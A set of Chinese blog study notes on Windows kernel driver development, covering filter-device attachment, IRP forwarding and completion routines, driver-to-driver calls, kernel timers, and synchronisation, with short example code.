    <title>驱动的挂载</title>
    <url>/2020/09/28/%E9%A9%B1%E5%8A%A8%E7%9A%84%E6%8C%82%E8%BD%BD/</url>
    <content><![CDATA[<h2 id="驱动的挂载"><a href="#驱动的挂载" class="headerlink" title="驱动的挂载"></a>驱动的挂载</h2><p>这个给我的感觉就有点像钩子链一样，一环接一环的。<br>上层设备可以对传过来的数据进行一层过滤，这一点又像hook技术。</p>
<p>挂载函数：<code>IoAttachDeviceToDeviceStack</code>，第一个参数是设备栈的一个设备指针，第二个参数是要挂载的设备对象，返回值的话呢就是第二个参数对象的下一设备对象。<br>打个比方，假设原来有一个设备对象链 B——C，其中B处于链的顶端，现在有一个新的设备对象A，执行IoAttachDeviceToDeviceStack (A,C)后，链就变成了A——B——C，同时函数返回B。<br>设备栈弹出的函数：<code>IoDetachDevice</code></p>
<h2 id="向下转发IRP"><a href="#向下转发IRP" class="headerlink" title="向下转发IRP"></a>向下转发IRP</h2><p>处理IRP的方式：</p>
<ol>
<li>直接处理IRP，使用IoCompleteRequest函数</li>
<li>调用StartIO，实现串行化</li>
<li>让底层驱动完成</li>
</ol>
<p>每一次调用IoCallDriver函数的时候，IRP的当前指针向下移动。<br>如果IRP不需要IO堆栈的时候，我们为了保持这个堆栈平衡，要使用IoSkipCurrentIrpStackLocation函数回移到上一层。<br>如果IRP还是需要操作，那么我们就需要将IRP参数向下复制一层，使用的函数是<code>IoCopyCurrentIrpStackLocationToNext</code>函数将当前的IRP参数复制到下一层。</p>
<p>挂载的顺序：</p>
<ol>
<li>首先我们先找到我们需要挂载的设备对象，使用IoGetDeviceObjectPointer函数得到目标设备对象</li>
<li>然后创建自己的设备对象</li>
<li>然后得到自己的设备扩展，并且得到自己的设备对象</li>
<li>使用IoAttachDeviceToDeviceStack函数挂载上自己的设备</li>
<li>然后记录下底层的设备对象（通过上一个函数的返回值，记录到设备扩展）</li>
<li>然后将我们的当前设备类型设置为和底层的设备类型一样（FilterDeviceObject-&gt;Devicetype = targetDevice-&gt;Device）</li>
<li>相同设备对象特征（FilterDeviceooject-&gt;Characteristics=TargetDevice-&gt;characteristics）</li>
<li>设置设备对象标记<ol>
<li>FilterDeviceObject-&gt;Flags &amp;= ~DO_DEVICE_INITIALIZING</li>
<li>上面就是去向这个标记</li>
<li>FilterDeviceObject-&gt;Flags |= (TargetDevice-&gt;Flags &amp;(DO_DIRECT_IO | DO_BUFFER_IO))</li>
<li>上面就是增加直接读取或者缓冲区读取</li>
</ol>
</li>
</ol>
<p><img src="img1.jpg" alt="1"><br><img src="img2.jpg" alt="2"></p>
<h2 id="转发IRP"><a href="#转发IRP" class="headerlink" title="转发IRP"></a>转发IRP</h2><p>我们成功挂载IRP之后，每次给目标驱动发送IRP的时候，都会经过我们的驱动。<br>所以我们在Read中要写IoSkipCurrentStackLocation，略过当前的堆栈，然后IoCallDriver(pdx-&gt;TargetDevice,irp)传递下去IRP。</p>
<h2 id="遍历设备对象"><a href="#遍历设备对象" class="headerlink" title="遍历设备对象"></a>遍历设备对象</h2><p>获取设备对象信息</p>
<ol>
<li>首先我们需要得到一个设备对象，然后使用OBJECT_TO_OBJECT_HEADER(DevObj)得到这个设备的头部</li>
<li>然后通过这个对象头得到相关的信息</li>
</ol>
<p>遍历设备的附加对象的指针：</p>
<ol>
<li>得到附加设备（DeviceObject = DevObj-&gt;AttachedDevice）</li>
<li>然后使用While循环一直DeviceObject = DevObj-&gt;AttachedDevice 循环获取，知道DeviceObject == NULL</li>
</ol>
<p>遍历设备信息：</p>
<ol>
<li>首先我们先从驱动名称得到驱动指针，使用ObReferenceObjectByName得到驱动指针</li>
<li>然后获得设备对象：DeviceObject = DriverObject-&gt;DeviceObject</li>
<li>然后使用while遍历设备对象<ol>
<li>先获取当前这个设备的信息</li>
<li>获取设备对象的附加信息</li>
<li>判断VPB中的设备（这个我暂时好不知道，貌似也是一个设备，暂时先略过）</li>
<li>DeviceObject = DeviceObject-&gt;NextDevice</li>
</ol>
</li>
</ol>
<h2 id="完成例程"><a href="#完成例程" class="headerlink" title="完成例程"></a>完成例程</h2><p>就是IRP完成后调用的函数。<br>我们想要设置本层的完成例程要使用函数：<code>IoSetCompletionRoutine</code>函数：</p>
<ol>
<li>要设置的IRP</li>
<li>完成例程</li>
<li>例程的参数</li>
<li>下面三个参数是否是IRP要进入完成例程（成功，错误，取消）</li>
</ol>
<p>如果使用了完成例程，我们就不能单纯的使用<code>IoSkipCurrentIrpStackLocation</code>函数忽略当前的设备堆栈，而必须要使用<code>IoCopyCurrentIrpStackLocationToNext</code>函数复制设备堆栈。</p>
<p>当我们调用IoCallDriver函数，我们就失去了对这个IRP的控制权，如果再操作IRP就会出错。<br>完成例程的时候还是可以操作这个IRP的，完成例程可以有两个返回值：</p>
<ol>
<li>STATUS_SUCCESS说明我们正常返回，IRP没有控制权了</li>
<li>STATUS_MORE_PROCESSING_REQUIRED会继续回到下一层设备的IRP处理例程，并且IRP的处理程序又会获得控制权了。</li>
</ol>
<h2 id="传播Pending位"><a href="#传播Pending位" class="headerlink" title="传播Pending位"></a>传播Pending位</h2><p>这个东西的意思就是说我们从底层驱动往回走的时候，在Control域中有一个SL_PENDING_RETURNED位需要传回到上一层，如果我们本层没有完成例程，那么系统会自动帮我们传递，但是如果有设备历程的话呢我们就需要手动传递了。<br>其实就是调用IoMarkIrpPending函数<br><img src="img3.jpg" alt="3"></p>
<h2 id="完成例程返回STATUS-SUCCESS"><a href="#完成例程返回STATUS-SUCCESS" class="headerlink" title="完成例程返回STATUS_SUCCESS"></a>完成例程返回STATUS_SUCCESS</h2><p>和上面的基本差不多，也就是如果是pending的话呢我们就传递pending位，然后就是根据自己的需要就行修改。</p>
<h2 id="完成例程返回STATUS-MORE-PROCESSING-REQUIRED"><a href="#完成例程返回STATUS-MORE-PROCESSING-REQUIRED" class="headerlink" title="完成例程返回STATUS_MORE_PROCESSING_REQUIRED"></a>完成例程返回STATUS_MORE_PROCESSING_REQUIRED</h2><p>简单的使用方法，比如说下面这个代码：<br><img src="img4.jpg" alt="4"><br><img src="img5.jpg" alt="5"></p>
<p>解释，首先我们过滤器接受到Read请求的时候，我们先IoCopyCurrentIrpStackLocationToNext，复制设备堆栈，然后初始化一个事件对象，然后设置完成例程，调用IoCallDriver，由于被挂载的设备直接返回挂起，所以直接返回，判断如果是pending的话呢就等待事件，与此同时，我们的设备例程也进入了，将这个事件设置SET了，这个时候我们的Read派遣函数就结束了。</p>
<h2 id="将IRP分解成多个IRP"><a href="#将IRP分解成多个IRP" class="headerlink" title="将IRP分解成多个IRP"></a>将IRP分解成多个IRP</h2><p>这个技术我感觉很有意思，就是说我们这个底层设备最多只能处理1024个字节的话呢，但是我们一下子请求了5000个字节的话呢，就需要我们这个过滤器，我们在派遣函数中进行拦截这个请求，然后如果他大于1024我们就先请求1024，然后在完成例程中返回STATUS_MORE_PROCESSING_REQUIRED回过头来再次请求，这样一次次就最终得到了5000个数据。<br>底层驱动的话呢使用的是直接读取的方式。<br>然后我们准备一个结构体：<br><img src="img6.jpg" alt="6"></p>
<p>然后编写我们的派遣函数：<br><img src="img7.jpg" alt="7"><br><img src="img8.jpg" alt="8"><br><img src="img9.jpg" alt="9"></p>
<p>分析：</p>
<ol>
<li>首先我们获得虚拟地址的大小和然后将虚拟地址映射到内核地址上</li>
<li>我们判断分段内容</li>
<li>然后申请一块新的MDL内存</li>
<li>创建新的一块映射</li>
<li>分配一块非分页内存来装我们的结构体</li>
<li>然后将我们的结构体补充完整</li>
<li>然后下面就是常规的赋值底层堆栈，地道IO堆栈，设置底层堆栈的读取长度，设置完成例程，调用下层堆栈，释放之前创建的MDL，为什么之前创建的还没用就释放了，原因是在我们完成例程中</li>
</ol>
<p><img src="img10.jpg" alt="10"><br><img src="img11.jpg" alt="11"><br>分析：</p>
<ol>
<li>首先我们得到我们之前封装的结构体</li>
<li>然后得到状态</li>
<li>然后得到我们实际得到的字节数</li>
<li>然后计算得到我们下次要读取的长度</li>
<li>然后重新利用MDL（我在微软官网上找到这样子的解释：如果 MDL 是通过调用 IoBuildPartialMdl 例程生成的，则驱动程序必须调用 MmPrepareMdlForReuse 例程或 IoFreeMdl 例程来释放系统地址空间映射。）就是说想要调用的话呢是要使用MmPrepareMdlForReuse函数来使用</li>
<li>再次做映射</li>
<li>然后操作就和派遣函数一样</li>
</ol>
<p>通过他的这段代码发现，当我们调用IoCallDriver的时候是先返回到完成例程，并不是先返回到过滤器的派遣例程，而且貌似我们如果在完成例程中返回STATUS_MORE_PROCESSING_REQUIRED，那么派遣函数IoCallDriver下面的代码就不会执行了。</p>
<p>但是我分析他可能有地方写错了，在最后一个返回应该是STATUS_SUCCESS，要不就没有出口了。</p>
<p>还有就是他的MDL操作，我这块确实没有搞得太明白，但是只能明白一个大概，而且很佩服他的这段代码，真是比较强！</p>
]]></content>
      <categories>
        <category>驱动开发</category>
      </categories>
      <tags>
        <tag>驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title>驱动调用驱动</title>
    <url>/2020/09/27/%E9%A9%B1%E5%8A%A8%E8%B0%83%E7%94%A8%E9%A9%B1%E5%8A%A8/</url>
    <content><![CDATA[<h2 id="驱动调用驱动"><a href="#驱动调用驱动" class="headerlink" title="驱动调用驱动"></a>驱动调用驱动</h2><p>其实在之前的文章已经记录过了，调用驱动其实就和用户层差不多，使用CreateFile类型的函数进行调用，但是需要注意的是一下两点：</p>
<ol>
<li>同步设备的话呢：第二个DesireAccess参数需要设置为SYNCHRONIZE，如果不是的话呢要设置为0。</li>
<li>同步设备的话呢：倒数第三个参数CreateOptions需要指定为FILE_SYNCHRONOUS_IO_NONALERT或者FILE_SYNCHRONOUS_IO_NALERT，异步设备的话呢不需要指定。</li>
</ol>
<p>同步调用的话呢没什么好说的，异步调用的话呢可以使用异步调用的回调函数，并且还可以使用返回的句柄转换为事件对象，用waitsingleforobject这个函数等待时间的完毕，但不要忘记将事件对象的计数减一。</p>
<p><strong>通过符号链接打开设备</strong></p>
<p>利用ZwOpenSymbolicLinkObject内核函数先得到符号连接的句柄，然后使用ZwQuerySymbolicLinkObject内核函数查找到设备名。<br>先初始化OBJECT_ATTRIBUTES对象，然后得到通过传递这个对象给ZwOpenSymbolicLinkObject函数得到符号链接句柄。通过设备链接句柄获得设备名称，然后通过这个设备名称初始化一个新的OBJECT_ATTRIBUTES对象，然后通过这个新的对象来CreateFile，下面的操作就一样了。</p>
<h2 id="通过设备指针调用其他驱动程序"><a href="#通过设备指针调用其他驱动程序" class="headerlink" title="通过设备指针调用其他驱动程序"></a>通过设备指针调用其他驱动程序</h2><p>ZwCreateFile获得设备的设备句柄，而如果想获得涉设备的文件对象指针用到IoGetDeviceObjectPointer：</p>
<ol>
<li>设备名</li>
<li>打开权限</li>
<li>返回的设备相关的文件对象指针</li>
<li>返回的设备对象指针</li>
</ol>
<p>这个函数会让设备对象加一，所以我们要在使用完之后调用ObDereferenceObject，如果我们不减一，那么在下一次调用IoGetDeviceObjectPointer的时候并不是真的生成一个新的对象，而是将之前的那个对象的内核计数加一返回给你。<br>内核计数加一的时候会调用IRP_MJ_CREATE，计数减到0会调用IRP_MJ_CLOSE，所以我们完全可以使用上面操作内核计数的函数代替Creat和close。</p>
<p>可以通过loBuildSynchronousFsdRequest和loBuildAsynchronousFsdRcquest两个内核函数创建IRP，它们分别用来创建同步类型的IRP和创建异步类型的IRP。这两个内核函<br>数可以创建 IRP_MJ_PNP、 IRP_MJ_READ、 IRP_MJ_WRITE、 IRP_MJ_FLUSH BUFFERS和 IRP_MJ_SHUTDOWN类型的IRP。</p>
<p>可以通过loBuildDeviceloControlRequest内核函数创建IRP_MJ_INTERNAL_DEVICE_CONTROL和IRP_MJ_DEVICE_CONTROL两个类型的IRP，这个内核函数只能创建同步类型的IRP。<br>另外，还可以使用 IoAllocatelrp内核函数，它可以创建任意类型的 IRP.<br>IoBuildSynchronousFsdRequest、IoBuildAsynchronousFsdRequest、IoBuildDeviceloControlRequest 这三个内核函数是属于靠近上层的内核函数。而IoAllocatelrp是比较底层的内核函数，以上三个内核函数都是通过调用 IoAllocateIrp实现的。</p>
<p>创建完IRP之后还要构造IO堆栈，每个设备对象都要一个设备堆栈。<br>最后通过IoCallDriver内核函数调用响应的驱动，这个函数会根据IRP找到响应的派遣函数。</p>
<p>loBuildSynchronousFsdRequest和loBuildAsynchronousFsdRcquest两个内核函数的最大区别就在于是否有时间等待。<br>loBuildSynchronousFsdRequest：</p>
<ol>
<li>IRP的类型</li>
<li>设备对象指针</li>
<li>输入输出缓冲区</li>
<li>缓冲区大小</li>
<li>偏移量</li>
<li>【同步事件】</li>
<li>操作状态</li>
</ol>
<h2 id="创建IRP"><a href="#创建IRP" class="headerlink" title="创建IRP"></a>创建IRP</h2><ol>
<li><p>首先我们先通过IoGetDeviceObjectPointer函数获得设备对象，然后判断一下是否成功，不成功返回，然后初始化一个同步事件，设置一个偏移量，然后就是创建一个同步的IRP，参数就是之前写的，然后得到下一层的IO堆栈，通过IoGetNextIrpStackLocation函数得到，这个函数的唯一一个参数就是我们刚才创建好的IRP对象指针，然后我们将这个IO堆栈对象的FileObject属性设置为我们之前在IoGetDeviceObjectPointer函数中得到的文件对象指针。最后调用IoCallDriver来调用IRP的派遣函数。然后我们就等待这个IRP结束，如果是被挂起的话呢说明异步，我们需要等待在之前创建的同步事件对象，然后关闭设备（这个不要忘记）ObDereferenceObject，这个函数的参数是我们之前得到的与驱动相关的文件对象指针。</p>
</li>
<li><p>使用loBuildAsynchronousFsdRcquest的话呢与之前那个不同的主要一点是提供Event的位置，一个是在函数中提供Event对象，而这个函数的话呢是在使用IoCallDriver之前和创建IRP之后将创建的IRP的UserEvent指定为我们创建的一个Event，其他的操作都是一样的。</p>
</li>
<li><p>用IoAllocateIrp相对麻烦一些，因为需要自己制定IRP的属性，这个函数只有两个参数，第一个是IO堆栈大小，第二个是是否要分配磁盘配额。在创建IRP之前都是一样，但是在创建完IRP之后是由比较大的区别的：</p>
<ol>
<li>首先我们将我们的Event时间对象传给IRP：IRP-&gt;UserEvent = &amp;event</li>
<li>将IO的状态指针传给他：IRP-&gt;UserIosb = &amp;status_block</li>
<li>设置IRP的线程号：IRP-&gt;Tail.Overlay.Thread = PsGetCurrentThread()</li>
<li>设置IRP的BUFFER：IRP.&gt;AssociatedIrp.SystemBuffer = NULL</li>
<li>获得设备堆栈：PIO_STACK_LOCATION stack = IoGetNextIrpStackLocation(IRP)</li>
<li>设置IRP的编号：stack-&gt;MajorFunction = IRP_MJ_READ</li>
<li>设置IRP的子IRP号：stack-&gt;MinorFunction = IRP_MN_NORMAL;//0</li>
<li>设置文件指针，这个指针是在我们得到设备指针的时候间接获得的：stack-&gt;FileObject = FileObject</li>
</ol>
</li>
</ol>
<h2 id="其他方法获得设备指针"><a href="#其他方法获得设备指针" class="headerlink" title="其他方法获得设备指针"></a>其他方法获得设备指针</h2><p>使用ObReferenceObjectByName获得设备指针，这个函数是DDK并没有公开的一个函数，但是在<code>ntoskrnl.exe</code>中存在，所以我们要指定原型：</p>
<p><img src="img1.jpg" alt="1"><br><img src="img2.jpg" alt="2"></p>
<ol>
<li>是UNICODE的设备名</li>
<li>属性一般是：OBJ_CASE_INSENSITIVE</li>
<li>这个参数很少用到，用NULL</li>
<li>这个是获得的权限，一般是FILE_ALL_ACCESS</li>
<li>这个就是我们在商用extern设置的变量：IoDeviceObjectType</li>
<li>访问模式，内核的话呢：KernelMode</li>
<li>很少用到，一般是NULL</li>
<li>返回的对象指针</li>
</ol>
<p>这个函数的功能强大，可以获取任何内核对象的指针，而我们之前的那个IoGetDeviceObjectPointer只能获得设备对象和文件的指针，因为这个函数也会使内核计数加一，所以最后还是要用到ObDereferenceObject使其减一。</p>
<h2 id="IoGetDeviceObjectPointer的内部结构"><a href="#IoGetDeviceObjectPointer的内部结构" class="headerlink" title="IoGetDeviceObjectPointer的内部结构"></a>IoGetDeviceObjectPointer的内部结构</h2><ol>
<li>用InitializeObjectAttributes函数构造OBJECT_ATTRIBUTES结构体</li>
<li>用ZwOpenFile内核函数打开设备文件对象的句柄</li>
<li>使用ObReferenceObjectByHandle函数获得这个文件对象的指针</li>
<li>用IoGetBaseFileSystemDeviceObject函数从设备文件对象指针得到设备指针</li>
</ol>
<p><img src="img3.jpg" alt="3"><br><img src="img4.jpg" alt="4"></p>
<p>这里有个错误就是在他的注释上，我们得到的不是设备对象指针，而是设备的文件对象的指针！<br>代码上没啥问题。</p>
]]></content>
      <categories>
        <category>驱动开发</category>
      </categories>
      <tags>
        <tag>驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title>驱动定时器</title>
    <url>/2020/09/26/%E9%A9%B1%E5%8A%A8%E5%AE%9A%E6%97%B6%E5%99%A8/</url>
    <content><![CDATA[<h2 id="IO定时器"><a href="#IO定时器" class="headerlink" title="IO定时器"></a>IO定时器</h2><p>就和应用程序的定时器差不多。<br>首先我们先初始化定时器，这个定时器需要一个函数例程，就是我们的定时函数，一般来说IoInitializeTimer函数是在DriverEntry函数中调用。<br>这个定时函数需要注意的是我们不能操作分页内存，因为他是在DISXXX级别上，并且我们开关定时器一般使用IOCTL进行控制。<br>开始计时器使用：<code>IoStartTimer</code><br>关闭计时器使用：<code>IoStopTimer</code><br>并且需要注意的是在定时器函数中我们最好使用互锁的函数，这样子稳定一些。</p>
<h2 id="DPC定时器"><a href="#DPC定时器" class="headerlink" title="DPC定时器"></a>DPC定时器</h2><p>DPC定时器也是一个队列的操作形式，相对比较灵活一些。<br>使用之前要初始化DPC对象和定时器对象：<code>KeInitializeTimer</code>和<code>KeInitializeDpc</code><br>开启DPC定时器：<code>KeSetTimer</code>第一个是定时器指针，第二个是时间间隔，第三个是DPC对象。<br>关闭DPC定时器：<code>KeCancelTimer</code>参数及时Timer对象。<br><code>KeSetTimer</code>的第二个参数如果是正数的话呢就是绝对时间，是1601年到现在的绝对时间，如果是负数的话呢是间隔多长时间。<br>注意的是DPC例程只能触发一次，如果想周期性的触发那么需要在DPC中再次调用KeSetTimer。<br>DCP例程有一个DPC对象指针和三个PVOID的参数：<br>第一个是DPC对象，第二个是在我们<code>KeInitializeDpc</code>指定的参数是第一个，其余两个可能由别的发来的吧。</p>
<p><strong>一般在驱动中使用时间都是用的负数，这样子才是相对的间隔时间</strong></p>
<h2 id="等待函数"><a href="#等待函数" class="headerlink" title="等待函数"></a>等待函数</h2><ol>
<li>KeWaitForSingleObject<ol>
<li>这个和平常用的那个区别就在于第二三个参数，我们一般使用Executive和KernelMode</li>
<li>时间的话呢我们一般要设置为负数</li>
</ol>
</li>
<li>KeDelayExecutionThread<ol>
<li>这个函数就是将当前线程睡眠一定的时间，然后转入运行状态</li>
</ol>
</li>
<li>KeStallExecutionProcessor<ol>
<li>这个函数比较耗CPU，他并不是休眠而是出于忙等待</li>
</ol>
</li>
<li>KTimer也是一个内核对象，也有激发态和为激发态，当我们在KeSetTimer的时候不指定DPC例程的话呢，在指定的时间过去之后KeWaitForSingleObject就会不等待了（其实就是第一种的变样子使用，不用Event而是使用Ktimer对象）</li>
</ol>
<h2 id="时间操作的函数"><a href="#时间操作的函数" class="headerlink" title="时间操作的函数"></a>时间操作的函数</h2><ol>
<li>KeQuerySystemTimer 参数就是OUT接受从1601.1.1到现在的时间，单位是100ns</li>
<li>ExSystemToLocalTime将系统时间转换为当前时区对应的时间，当前时区可以通过控制面板进行设置。第一个参数是格林尼治时间，第二个是OUT接受当地时间。</li>
<li>ExLocalTimeToSystemTime是讲当前时区的时间转换为格林尼治的时间。</li>
<li>RtlTimeFieldsToTime是将当前的年月日得到系统时间，第一个参数是一个结构体，一看就知道了的。类似的还有RtlTimeToTimeFields</li>
</ol>
<h2 id="IRP的超时取消原理"><a href="#IRP的超时取消原理" class="headerlink" title="IRP的超时取消原理"></a>IRP的超时取消原理</h2><p>首先初始一个定时器对象和DPC对象，并将DPC例程和定时器对象进行关联。在每次对IRP操作前，开启定时器，并设置好一定的超时。如果在指定时间内对IRP的处理没有结束，那么操作系统就会就会进入 DPC例程。<br>在DPC例程中取消还在继续处理的IRP。如果驱动程序能在超时前结束IRP的操作，则应该取消定时器，从而保证不会再次取消IRP。</p>
<p>DPC的最小时间间隔是ms，而IO的是s！</p>
]]></content>
      <categories>
        <category>驱动开发</category>
      </categories>
      <tags>
        <tag>驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title>驱动同步处理</title>
    <url>/2020/09/23/%E9%A9%B1%E5%8A%A8%E5%90%8C%E6%AD%A5%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h2 id="分页内存故障"><a href="#分页内存故障" class="headerlink" title="分页内存故障"></a>分页内存故障</h2><p>分页内存由于有可能将磁盘文件映射过来，但是当读取不是在物理内存的时候会产生一个异常，这个异常会执行异常处理函数，原本是正常的，但是如果出现DISPATCH_LEVEL级别的异常线程中的时候会导致系统的崩溃。<br>对于等于或者高于DISPATCH_LEVEL级别的程序不能使用分页内存。</p>
<h2 id="IRQL的升降"><a href="#IRQL的升降" class="headerlink" title="IRQL的升降"></a>IRQL的升降</h2><p>可以使用KeRaiseIrql和KeLowerIrql进行调节程序异常的级别。</p>
<h2 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h2><p>就是常规的资源站用锁，这种锁如果被占有，那么其他线程要用到的话呢会一直询问，所以时间不宜太长，并且不能在高于DISPATCH_LEVEL的线程上使用。<br>这个锁不适合用在全局变量，而适合放在设备扩展中，名称为KSPIN_LOCK。<br>如果线程优先级是DISPATCH_LEVEL的话呢我们可以直接使用KeAcquireSpinlockAtDpcLevel，而如果不是这个优先级的话呢要使用KeAcquireSpinlock这个函数，因为它可以自动帮你调整优先级，并在释放的时候调整回来。</p>
<h2 id="内核模式下的同步对象"><a href="#内核模式下的同步对象" class="headerlink" title="内核模式下的同步对象"></a>内核模式下的同步对象</h2><p>用户操作的事件对象其实只是一个句柄，而在内核模式下操作的就是真正的指针</p>
<h2 id="线程归属"><a href="#线程归属" class="headerlink" title="线程归属"></a>线程归属</h2><p>PsCreateSystemThread函数当我们使用用户线程创建线程的时候，创建的线程归属用户进程，而我们穿进去的是NULL（系统），那归属就是system。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">CreateThread_test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hSystemThread, hMyThread;</span><br><span class="line">	NTSTATUS status = PsCreateSystemThread(&amp;hSystemThread, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, SystemThread, <span class="literal">NULL</span>);</span><br><span class="line">	status = PsCreateSystemThread(&amp;hMyThread, <span class="number">0</span>, <span class="literal">NULL</span>, NtCurrentProcess(), <span class="literal">NULL</span>, MyThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一个创建的就是系统进程，第二个就是调用这个IRP的进程。</p>
<h2 id="内核等待时间"><a href="#内核等待时间" class="headerlink" title="内核等待时间"></a>内核等待时间</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">MyProcessThread</span><span class="params">(IN PVOID pContext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PKEVENT pEvent = (PKEVENT)pContext;</span><br><span class="line">	KdPrint((<span class="string">"enter MyThread"</span>));</span><br><span class="line">	KeSetEvent(pEvent, IO_NO_INCREMENT, FALSE);</span><br><span class="line">	KdPrint((<span class="string">"Leave Thread"</span>));</span><br><span class="line">	PsTerminateSystemThread(STATUS_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span>  PAGECODE</span></span><br><span class="line"><span class="function">VOID <span class="title">Test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hMyThread;</span><br><span class="line">	KEVENT kEvent;</span><br><span class="line">	KeInitializeEvent(&amp;kEvent, NotificationEvent, FALSE);</span><br><span class="line">	NTSTATUS status = PsCreateSystemThread(&amp;hMyThread, <span class="number">0</span>, <span class="literal">NULL</span>, NtCurrentProcess(), <span class="literal">NULL</span>, MyProcessThread, &amp;kEvent);</span><br><span class="line">	KeWaitForSingleObject(&amp;kEvent, Executive, KernelMode, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用起来和用户模式下没啥太大的区别，就多了几个参数，<code>KeWaitForSingleObject</code>第二第三个一般就是这两个参数，这里需要注意的是，如果我们没有等待，那么kEvent被回收的话呢，线程将崩溃。</p>
<h2 id="内核与应用程序的Event线程等待"><a href="#内核与应用程序的Event线程等待" class="headerlink" title="内核与应用程序的Event线程等待"></a>内核与应用程序的Event线程等待</h2><p>使用DeviceIOControl交互我们的Event实现用户线程和内核线程的同步（写这段代码的时候稍微不注意就会蓝屏，幸好没问题）</p>
<p>IOControl驱动代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">HelloDDKDeviceControl</span><span class="params">(IN PDEVICE_OBJECT pDevObj, IN PIRP pirp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">	KdPrint((<span class="string">"Enter Control\n"</span>));</span><br><span class="line">	PIO_STACK_LOCATION <span class="built_in">stack</span> = IoGetCurrentIrpStackLocation(pirp);</span><br><span class="line">	ULONG cbin = <span class="built_in">stack</span>-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">	ULONG cbout = <span class="built_in">stack</span>-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line">	ULONG code = <span class="built_in">stack</span>-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">	ULONG infor = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">switch</span> (code)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> IOCTL_TEST:</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"IOCTL_TEST\n"</span>));</span><br><span class="line">		HANDLE hUserEvent = *(HANDLE*)pirp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">		PKEVENT pEvent;</span><br><span class="line">		status = ObReferenceObjectByHandle(hUserEvent, EVENT_MODIFY_STATE, *ExEventObjectType, KernelMode, (PVOID*)&amp;pEvent, <span class="literal">NULL</span>);</span><br><span class="line">		KeSetEvent(pEvent, IO_NO_INCREMENT, FALSE);</span><br><span class="line">		ObDereferenceObject(pEvent);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		status = STATUS_FILE_INVALID;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	pirp-&gt;IoStatus.Status = status;</span><br><span class="line">	pirp-&gt;IoStatus.Information = infor;</span><br><span class="line">	IoCompleteRequest(pirp, IO_NO_INCREMENT);</span><br><span class="line">	KdPrint((<span class="string">"Leave DeviceControl\n"</span>));</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是我们在通过ObReferenceObjectByHandle函数获得到句柄的真实对象的时候，内核计数将会加一，所以我们要在最后减一，ObDereferenceObject函数就可以实现，驱动端实现的就是释放这个时间，让等待的线程跑起来。<br>ObReferenceObjectByHandle参数有点多：</p>
<ol>
<li>事件句柄</li>
<li>EVENT_MODIFY_STATE允许使用SetEvent,,ResetEvent和PulseEvent函数（网上找到的相关说明）</li>
<li>ObjectType：<ol>
<li><code>*ExEventObjectType, *ExSemaphoreObjectType, *IoFileObjectType, *PsProcessType, *PsThreadType, *SeTokenObjectType, *TmEnlistmentObjectType, *TmResourceManagerObjectType, *TmTransactionManagerObjectType, or *TmTransactionObjectType.</code></li>
</ol>
</li>
<li>KernelMode内核模式下运行</li>
<li>(PVOID*)&amp;pEvent这个东西我总觉得有问题，但是这样没错，这其实是个指针的指针</li>
<li>最后一个必须为NULL</li>
</ol>
<p>用户层代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  IOCTL_TEST CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br></pre></td></tr></table></figure>
<p>现将我们的宏设置上去<br>写一个简单的线程：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">UINT __<span class="function">stdcall <span class="title">testThread</span><span class="params">(LPVOID par)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE* hEvent = (HANDLE*) par;</span><br><span class="line">	WaitForSingleObject(*hEvent,INFINITE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"jieshu\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>等待驱动给我们响应。</p>
